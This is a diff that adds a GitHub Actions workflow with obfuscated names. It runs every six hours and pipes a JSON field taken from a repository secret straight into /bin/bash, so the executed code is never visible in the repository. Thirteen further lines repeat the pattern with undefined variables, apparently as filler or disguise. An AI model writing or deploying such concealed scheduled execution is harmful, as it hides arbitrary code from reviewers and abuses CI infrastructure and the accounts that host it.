@@ -1,0 +1,30 @@
+name: lingyituandealin
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '53 0/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: lingyituandealin
+        env:
+          rwv67: ${{ secrets.rwv67 }}
+        run: |
+          echo $rwv67 | jq -r .rnx9296 | /bin/bash
+          echo $wc07604 | jq -r .ss5 | /bin/bash
+          echo $za89713 | jq -r .m253 | /bin/bash
+          echo $b9 | jq -r .hmfj34666 | /bin/bash
+          echo $ue13 | jq -r .kmu295 | /bin/bash
+          echo $z359 | jq -r .rlnvd1663 | /bin/bash
+          echo $fz6085 | jq -r .aadea908 | /bin/bash
+          echo $kxkak21 | jq -r .a162 | /bin/bash
+          echo $yvkyd0 | jq -r .on96812 | /bin/bash
+          echo $v71450 | jq -r .yfjt71 | /bin/bash
+          echo $fbvv3010 | jq -r .x12719 | /bin/bash
+          echo $jtvt16 | jq -r .xf12 | /bin/bash
+          echo $fx23 | jq -r .zilps9354 | /bin/bash
+          echo $q3 | jq -r .xxjrp499 | /bin/bash
+
